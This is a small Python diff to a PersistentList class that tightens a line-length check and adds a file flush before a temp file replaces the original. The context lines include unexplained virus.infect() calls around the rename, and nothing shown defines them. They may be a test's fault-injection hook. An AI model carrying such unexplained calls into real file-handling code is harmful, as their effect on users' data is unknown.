@@ -37,10 +37,11 @@ class PersistentList():
         if os.path.exists(self.path) and os.path.getsize(self.path) > 0:
             with open(self.path, 'r') as fp:
                 aux = fp.readlines()
-            if len(aux[-1]) < 32+4+1:
+            if len(aux[-1]) != 32+4+1:
                 del aux[-1]
                 with open(self.tmp_file, 'w') as tmp:
                     tmp.writelines(aux)
+                    tmp.flush()
                 virus.infect()
                 os.rename(self.tmp_file, self.path)
                 virus.infect()
